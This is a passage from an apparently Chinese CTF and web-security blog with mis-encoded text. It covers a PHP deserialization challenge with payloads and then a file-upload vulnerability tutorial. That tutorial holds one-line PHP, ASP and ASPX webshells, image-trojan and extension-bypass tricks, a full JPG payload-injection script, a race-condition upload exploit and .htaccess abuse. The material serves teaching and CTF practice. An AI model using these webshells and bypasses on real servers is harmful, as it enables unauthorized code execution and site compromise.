O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;å®é™…ä¸Šusernameçš„é•¿åº¦æ˜¯186ï¼Œä½†æ˜¯è¢«æ›¿æ¢ä¹‹åæˆä¸º # è¢« filter æ›¿æ¢ä¹‹åå˜æˆ O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securedsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecured&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;# è¿™æ ·å°±è¡¥é½äº† payloadï¼š 1postä¼ å‚ï¼š username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure%22;s:8:%22password%22;s:6:%22hacker%22;&#125;&amp;password=123 2 Just Serizlize123456789101112131415161718192021222324&lt;?phphighlight_file(__FILE__);include &#x27;flag.php&#x27;;// $flag = &quot;DASCTF&#123;xxxxx&#125;&quot;$obj = $_GET[&#x27;obj&#x27;];if (preg_match(&#x27;/flag/i&#x27;, $obj))&#123; die(&quot;?&quot;);&#125;$obj = @unserialize($obj);if ($obj-&gt;flag === &#x27;flag&#x27;)&#123; $obj-&gt;flag = $flag;&#125;foreach ($obj as $k =&gt; $v)&#123; if ($k !== &quot;flag&quot;) &#123; echo $v; &#125;&#125;?&gt; åˆ†æï¼š GET ä¼ å‚ objï¼› ä¼ å…¥å‚æ•°ä¸å¾—å«æœ‰ flagï¼›å¯¹è±¡ä¸­åŒ…å« flag å­—æ®µæ—¶ï¼Œæ‰ä¼šä¼ å…¥ $flag çš„å†…å®¹ï¼›ä½†å½“å­—æ®µåä¸ä¸º flag æ—¶ï¼Œæ‰èƒ½æ˜¾ç¤ºå‡º $flagï¼› hex ç¼–ç ç»•è¿‡ if ($k !== &quot;flag&quot;) ï¼ŒæŠŠ s æ¢æˆ Sï¼› è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶, ä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æ, å®šä¹‰ä¸€ä¸ªå˜é‡å– flag å˜é‡çš„åœ°å€å³å¯å¾—åˆ° flag å˜é‡çš„å€¼ï¼› 123456 &lt;?php $obj = (object)[&#x27;flag&#x27;=&gt;&#x27;flag&#x27;]; $obj-&gt;Hh0 = &amp;$obj-&gt;flag; echo serialize($obj);# å¾—åˆ° O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;s:3:&quot;Hh0&quot;;R:2;&#125; payloadï¼š 1234?obj=O:8:&quot;stdClass&quot;:2:&#123;S:4:&quot;\\66\\6c\\61\\67&quot;;S:4:&quot;\\66\\6c\\61\\67&quot;;s:3:&quot;Hh0&quot;;R:2;&#125;?obj=O:8:&quot;stdClass&quot;:2:&#123;S:4:&quot;\\66\\6c\\61\\67&quot;;S:4:&quot;\\66\\6c\\61\\67&quot;;s:3:&quot;asd&quot;;R:2;&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´","slug":"æ–‡ä»¶ä¸Šä¼ æ¼æ´","date":"2021-06-06T14:42:17.000Z","updated":"2021-10-08T12:05:09.617Z","comments":true,"path":"2021/06/06/æ–‡ä»¶ä¸Šä¼ æ¼æ´/","link":"","permalink":"https://xizhi-future.github.io/2021/06/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"ä¸€ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´ 1234æˆå› ï¼šæœåŠ¡å™¨é…ç½®ä¸å½“å¯¼è‡´ä»»æ„æ–‡ä»¶ä¸Šä¼ Webåº”ç”¨å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„é™åˆ¶ç¨‹åºå¼€å‘éƒ¨ç½²æ—¶ï¼Œç”±äºæœªè€ƒè™‘ç³»ç»Ÿç‰¹æ€§æˆ–éªŒè¯è€Œå¯¼è‡´é™åˆ¶è¢«ç»•è¿‡","text":"ä¸€ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´ 1234æˆå› ï¼šæœåŠ¡å™¨é…ç½®ä¸å½“å¯¼è‡´ä»»æ„æ–‡ä»¶ä¸Šä¼ Webåº”ç”¨å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„é™åˆ¶ç¨‹åºå¼€å‘éƒ¨ç½²æ—¶ï¼Œç”±äºæœªè€ƒè™‘ç³»ç»Ÿç‰¹æ€§æˆ–éªŒè¯è€Œå¯¼è‡´é™åˆ¶è¢«ç»•è¿‡ 1.1 æ¡ä»¶1231.WebæœåŠ¡å™¨å¼€å¯äº†æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œä¸”ä¸Šä¼ apiï¼ˆæ¥å£ï¼‰å¯¹å¤–å¼€æ”¾ï¼ˆWebç”¨æˆ·å¯ä»¥è®¿é—®ï¼‰2.Webç”¨æˆ·å¯¹ç›®æ ‡ç›®å½•å…·æœ‰å¯å†™æƒé™ï¼Œç”šè‡³å…·æœ‰æ‰§è¡Œæƒé™3.ä¸Šä¼ çš„æ–‡ä»¶å¯æ‰§è¡Œï¼Œå³Webå®¹å™¨å¯ä»¥è§£ææˆ‘ä»¬ä¸Šä¼ çš„è„šæœ¬ 1.2 WebShell è®¡ç®—æœºç§‘å­¦ä¸­ï¼ŒShellä¿—ç§°ä¸ºâ€œå£³â€ï¼ŒæŒ‡çš„æ˜¯â€œä¸ºä½¿ç”¨è€…æä¾›æ“ä½œç•Œé¢â€çš„è½¯ä»¶ï¼Œå³å‘½ä»¤è§£é‡Šå™¨ã€‚ç›¸å½“ä¸Windowsç³»ç»Ÿçš„cmd.exeï¼ŒLinuxç³»ç»Ÿä¸­çš„bashã€‚Webshellæœ¬è´¨ä¸Šæ˜¯åœ¨æœåŠ¡å™¨ç«¯å¯è¿è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œä»¥Webæ–¹å¼ï¼ˆHTTPåè®®ï¼‰å»é€šä¿¡ï¼ˆä¼ é€’å‘½ä»¤æ¶ˆæ¯ï¼‰ã€‚å®ƒæ˜¯ä¸€ä¸ªç½‘ç«™çš„åé—¨ï¼Œåç¼€åä¸º.php/,asp/.aspx/.jspç­‰ã€‚å³Webshellæ¥å—æ¥è‡ªWebç”¨æˆ·çš„å‘½ä»¤ï¼Œåœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œã€‚ 1.3 å°é©¬å°é©¬ åŸç†ï¼š 1234567ç¤ºä¾‹ï¼š &lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;è§£é‡Šï¼š1.&lt;?php ?&gt;--phpä»£ç çš„æ ‡è¯†ï¼Œä½¿æœåŠ¡å™¨æŒ‰ç…§ phpä»£ç å»è§£æ2.@--å½“æ‰§è¡Œé”™è¯¯çš„æ—¶å€™ï¼Œä¸ä¼šæŠ¥é”™3.eval()--æŠŠå­—ç¬¦ä¸²ä½œä¸º phpä»£ç å»æ‰§è¡Œ4.$_POST--ä»¥POSTæ–¹å¼è·å– cmdå‚æ•° 12345678asp:&lt;%eval request(&quot;cmd&quot;)%&gt;aspx: &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);%&gt;php:&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;]); ?&gt;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&quot;&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;&quot;); ?&gt; å˜å½¢ä¸€å¥è¯ å·¥å…·ï¼šä¸­å›½èœåˆ€æ–‡ä»¶ç®¡ç†ï¼šæŸ¥çœ‹ï¼Œä¸Šä¼ ï¼Œä¸‹è½½ï¼Œä¿®æ”¹ï¼Œåˆ é™¤ï¼Œè¿è¡Œexeç¨‹åºè™šæ‹Ÿç»ˆç«¯ï¼šcmdçª—å£æ•°æ®åº“ç®¡ç†ï¼šéœ€è¦å¡«å†™ç›¸å…³é…ç½® 12345&lt;T&gt;MYSQL&lt;T&gt;&lt;H&gt;localhost&lt;H&gt;&lt;U&gt;root&lt;U&gt;&lt;P&gt;å¯†ç &lt;P&gt; ä¸ºç©ºå¯ä¸å†™&lt;L&gt;utf8&lt;L&gt; 1.4 é»‘ç™½åå•ç­–ç•¥URLBlacklistâ€“é»‘åå•ä¸€å¾‹ ç¦æ­¢ URLWhitelistâ€“ç™½åå•ä¸€å¾‹ å…è®¸ äºŒã€é˜²å¾¡2.1 å‰ç«¯é™åˆ¶ä¸ç»•è¿‡ä¾‹å¦‚ï¼šæ£€æµ‹æ–‡ä»¶åç¼€åç­‰ 12æ–¹æ³•ä¸€ï¼šç›´æ¥ä¿®æ”¹ JS ä»£ç ï¼Œæˆ–è€…ç›´æ¥åˆ é™¤è¡¨å•äº‹ä»¶æ–¹æ³•äºŒï¼šå…ˆä½¿æ¶æ„æ–‡ä»¶åç¼€åç¬¦åˆç™½åå•ç­–ç•¥ï¼Œç„¶å Burp æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€å 2.2 æœåŠ¡å™¨ç«¯æ£€æµ‹ï¼‘.MIME ç±»å‹ MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚ç®€å•è¯´ï¼Œå°±æ˜¯ ä¸åŒçš„æ–‡ä»¶ç±»å‹ å¯¹åº”äº ä¸åŒçš„åº”ç”¨ç¨‹åºã€‚ 12345.docx application/vnd.openxmlformats-officedocument.wordprocessingml.document.pdf application/pdf.ppt application/vnd.ms-powerpoint.pptx application/vnd.openxmlformats-officedocument.presentationml.presentation.pdf application/pdf 12345.gif image/gif.htm .html text/html.jpeg .jpg image/jpeg.js text/javascript.png image/png 1234.svg image/svg+xml.xml application/xml.rar application/x-rar-compressed.zip application/zip HTTPåè®®ä¸­ï¼Œä½¿ç”¨ Content-Type å­—æ®µ è¡¨ç¤º MIMEç±»å‹ 2.æ–‡ä»¶å†…å®¹123getimagesize() å‡½æ•°:ä¼šæµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å› å›¾åƒçš„å°ºå¯¸ ä»¥åŠ æ–‡ä»¶ç±»å‹ åŠå›¾ç‰‡ é«˜åº¦ ä¸ å®½åº¦æˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ 1exif_imagetype() å‡½æ•° è¯¥å‡½æ•°ç›¸å½“äºæ£€éªŒäº†ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼Œæ£€æµ‹å…¶æ˜¯å¦çœŸçš„æ˜¯ä¸€å¼ å›¾ç‰‡ã€‚æ­¤æ—¶å°±ä¸èƒ½ç›´æ¥ä¸Šä¼  phpå†…å®¹ çš„æ–‡ä»¶äº†ã€‚ æ–¹æ³•ä¸€ï¼šåˆ¶ä½œå›¾ç‰‡æœ¨é©¬1234GIF89a&lt;?phpphpinfo();?&gt; 1234å›¾ç‰‡åˆå¹¶ï¼šå‘½ä»¤ï¼šcopy 1.jpg/b+phpinfo.php/a hack.jpgä»¥äºŒè¿›åˆ¶çš„æ–¹å¼æ‰“å¼€ï¼Œå†™å…¥æ–‡ä»¶ 1å†™å…¥åˆ° ç‰ˆæƒ å½“ä¸­ æ–¹æ³•äºŒï¼šæ–‡ä»¶å¹»æœ¯â€“åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸ºäº†æ›´æ–¹ä¾¿çš„åŒºåˆ«ä¸åŒæ–‡ä»¶çš„ç±»å‹ï¼Œç›¸åŒç±»å‹çš„æ–‡ä»¶æœ€å¼€å¤´æœ‰ç€ç›¸åŒçš„å­—èŠ‚ã€‚| åç¼€å | æ–‡ä»¶å¤´ || â€”â€” | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ || .gif | 47 49 46 38 39 61 F1 00 2C 01 F7 00 00 64 32 33 || .jpg | FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 01 2C || .png | 89 50 4E 47 0D 0A 1A 0A 00 00 00 00 49 48 44 52 | Hex-&gt;Ascii æ–¹æ³•ä¸‰ï¼šå±æ€§ç‰ˆæœ¬ ç›´æ¥åŠ ä¸€å¥è¯æ–¹æ³•å››ï¼š010Editor ç›´æ¥åŠ ä¸€å¥è¯ç›¸å½“äºæ–¹æ³•ä¸‰ 3.åç¼€åâ€“é»‘ç™½åå•ç­–ç•¥é»‘åå•ï¼šå¯»æ‰¾å…¶å®ƒå¯å…è®¸ä¸Šä¼ çš„ç±»å‹å»ç»•è¿‡é™åˆ¶ 123.php .php2 .php3 .php5 .phtml.asp .aspx .ascx .ashx .asa .cer.jsp .jspx 4.äºŒæ¬¡æ¸²æŸ“å‚è€ƒ1 å‚è€ƒ2 å°±æ˜¯å°†ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡é‡æ–°ç”Ÿæˆ 12345678910111213basename() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†&lt;?php$path = &quot;/testweb/home.php&quot;;//æ˜¾ç¤ºå¸¦æœ‰æ–‡ä»¶æ‰©å±•åçš„æ–‡ä»¶åecho basename($path);//æ˜¾ç¤ºä¸å¸¦æœ‰æ–‡ä»¶æ‰©å±•åçš„æ–‡ä»¶åecho basename($path,&quot;.php&quot;);?&gt; è¾“å‡ºï¼šhome.phphome 123imagecreatefromjpeg(filename)ï¼šç”±åŸæ–‡ä»¶è·¯å¾„ç”Ÿæˆä¸€ä¸ªä¿¡å¿ƒçš„å›¾åƒfilename JPEG å›¾åƒçš„è·¯å¾„ã€‚ 123bool imagejpeg ( resource image [, string filename [, int quality]] ) imagejpeg() ä» image å›¾åƒä»¥ filename ä¸ºæ–‡ä»¶ååˆ›å»ºä¸€ä¸ª JPEG å›¾åƒã€‚image å‚æ•°æ˜¯ imagecreatefromjpeg ç­‰å‡½æ•°çš„è¿”å›å€¼ã€‚ 12unlink(filename,context) :å‡½æ•°åˆ é™¤æ–‡ä»¶è‹¥æˆåŠŸï¼Œåˆ™è¿”å› trueï¼Œå¤±è´¥åˆ™è¿”å› false æ–¹æ³•ä¸€ï¼šgif ç»•è¿‡ä½¿ç”¨ 010å°†gifå›¾ç‰‡çš„æœ€ååŠ ä¸Šä¸€å¥è¯ï¼Œä¸Šä¼ ä¹‹åï¼Œå°†ä¸Šä¼ ä¹‹åçš„å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œå†æ¬¡æ‰“å¼€010æŸ¥çœ‹ï¼Œå‘ç°åŸæœ¬æˆ‘ä»¬å†™å…¥çš„ä¸€å¥è¯å·²ç»æ¶ˆå¤±äº†ã€‚ ä½†ä¸ä¹‹å‰çš„å›¾ç‰‡è¿›è¡Œå¯¹ç…§ï¼Œä»æœ‰æœªç»æ¸²æŸ“ï¼ˆæ”¹å˜ï¼‰çš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥è®²ä¸€å¥è¯å†™å…¥ä¸ä¼šè¢«æ¸²æŸ“çš„éƒ¨åˆ†è¿›è¡Œä¸Šä¼ å³å¯ã€‚ å›¾ç‰‡æœ«å°¾åŠ ä¸€å¥è¯ ç»è¿‡æ¸²æŸ“ï¼Œä¸€å¥è¯æ¶ˆå¤± æ‰¾åˆ°æœªç»æ¸²æŸ“çš„éƒ¨åˆ†ï¼ŒåŠ ä¸€å¥è¯ï¼Œä¸Šä¼  æœªè¢«æ¸²æŸ“æ‰ æ–¹æ³•äºŒï¼špngç»•è¿‡pngå›¾ç‰‡ç”±ä¸‰ä¸ªä»¥ä¸Šçš„æ•°æ®å—ç»„æˆ ä¸¤ç§ç±»å‹çš„æ•°æ®å—ï¼š 1)å…³é”®æ•°æ®å— 2)è¾…åŠ©æ•°æ®å—ï¼šPLTE æ–¹æ³•ä¸€ï¼šå†™å…¥IDATæ•°æ®å— 1)ç›´æ¥åœ¨æœ¬åœ°è¿è¡Œè„šæœ¬ï¼Œç”Ÿæˆ1.pngå›¾ç‰‡ 12345678910111213141516171819&lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); &#125;imagepng($img,&#x27;./1.png&#x27;); ?&gt; æ–¹æ³•äºŒï¼šå†™å…¥PLTEæ•°æ®å— æ–¹æ³•ä¸‰ï¼šjpgç»•è¿‡123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; å…ˆæ‰¾ä¸€å¼ jpgä¸Šä¼ ï¼Œå°†ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡Œä¸‹è½½ï¼Œkaliè¿è¡Œè„šæœ¬ php ben.php 21044.jpg 010æ‰“å¼€æŸ¥çœ‹ å†™å…¥æˆåŠŸ 5.æ¡ä»¶ç«äº‰ç¤ºä¾‹ 123456789101112if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; ä¹‹å‰éƒ½æ˜¯ï¼Œé¦–å…ˆåˆ¤æ–­ æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ æ˜¯å¦ ç¬¦åˆç™½åå•ï¼Œæˆ–è€…æ˜¯ä¸åœ¨é»‘åå•å½“ä¸­ï¼›åªæœ‰å½“æ¡ä»¶ç¬¦åˆæ—¶ï¼Œæ‰ä¼šä½¿ç”¨ move_uploaded_file($temp_file, $upload_file) å°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œè·¯å¾„ç§»åŠ¨ã€‚ è€Œæœ¬é¢˜æ—¶é¦–å…ˆå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œè·¯å¾„ç§»åŠ¨ï¼Œç„¶åå†åˆ¤æ–­æ˜¯å¦ç¬¦åˆç™½åå•ï¼Œå¦‚æœä¸ç¬¦åˆçš„è¯ï¼Œå°±ä¼šä½¿ç”¨ unlink($upload_file); å°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œ åˆ é™¤ ã€‚ å› æ­¤å¦‚æœæˆ‘ä»¬æƒ³è¦ä¸Šä¼  .php æ–‡ä»¶çš„è¯ï¼Œå°±éœ€è¦ åœ¨ å…¶æœåŠ¡å™¨åˆ é™¤æˆ‘ä»¬çš„æ–‡ä»¶ä¹‹å‰è¿›è¡Œè®¿é—®åˆ©ç”¨ã€‚ æ–¹æ³•ï¼šçŸ­æ—¶é—´å†…ä¸æ–­é‡å¤ä¸Šä¼ è¯¥æ–‡ä»¶ï¼Œå¯ä½¿ç”¨ BurpSuite æ–¹æ³•ä¸€ï¼šBurp Suite çˆ†ç ´ä¸Šä¼ ä¸€ä¸ªkey.php 1&lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#x27;&lt;?php phpinfo();?&gt;&#x27;); ?&gt; //æ­¤ä»£ç çš„ä½œç”¨æ˜¯åªè¦ ä¸€è®¿é—®åˆ°key.phpï¼Œæ­¤è„šæœ¬å°±è¢«è§£æ è¿›è€Œç”Ÿæˆinfo.phpæ–‡ä»¶ï¼Œå†…å®¹ä¸º &lt;?php phpinfo();?&gt; è¿›è¡Œæ— é™æ¬¡çš„ ä¸Šä¼  key.php å’Œæ— é™æ¬¡çš„è®¿é—® key.php ç›´åˆ°è®¿é—®çš„çŠ¶æ€ç ä¸º200å³ä¸Šä¼  info.phpæˆåŠŸ æ–¹æ³•äºŒï¼šè®¿é—®éƒ¨åˆ†å¯ä½¿ç”¨ pythonè„šæœ¬1234567import requests url = &quot;http://127.0.0.1:8090/upload/key.php&quot; while True: html = requests.get(url) if html.status_code == 200: print(&quot;OK&quot;) break else:print(&quot;NO&quot;) ä¸‰ã€.htaccess æ”»å‡» httpd-conf æ˜¯APache ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶ï¼ˆå…¨å±€çš„ï¼‰ï¼› .htaccess æ–‡ä»¶æ˜¯ Apache æœåŠ¡å™¨çš„åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼ˆå±€éƒ¨çš„ï¼‰ï¼Œè¯¥é…ç½®æ–‡ä»¶ä¼šè¦†ç›–ApacheæœåŠ¡å™¨çš„å…¨å±€é…ç½®ï¼Œåªå¯¹ è¯¥æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨ã€‚å¦‚æœä¸€ä¸ªWebåº”ç”¨ç¨‹åºå…è®¸ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œåˆ™è¯´æ˜æ”»å‡»è€…å¯ä»¥æ›´æ”¹Apacheçš„é…ç½®ã€‚ ç¼ºç‚¹ï¼šåªåœ¨ Apache æœåŠ¡å™¨ ä¸‹èµ·ä½œç”¨ ä½¿ç”¨æ¡ä»¶ï¼š Apacheç›®å½•ä¸‹ï¼š/conf/httpd.conf ä¸­ AllowOverride ä¸º All åˆ™æ„å‘³ç€.htaccess æ–‡ä»¶å¯æ›´æ”¹ Apache é…ç½® 3.1 åˆ©ç”¨ä¸€ï¼šå°†.png æ–‡ä»¶å½“ä½œ PHPæ–‡ä»¶å¤„ç†123å°†æ‰€æœ‰.pngæ ¼å¼çš„å›¾ç‰‡éƒ½å½“ä½œ.phpå¤„ç†ï¼šphpinfo.pngåœ¨ .htaccess æ–‡ä»¶ä¸­å†™å…¥ï¼šAddType application/x-httpd-php .png 3.2 åˆ©ç”¨äºŒï¼šæ–‡ä»¶ä¸­åŒ…å« php 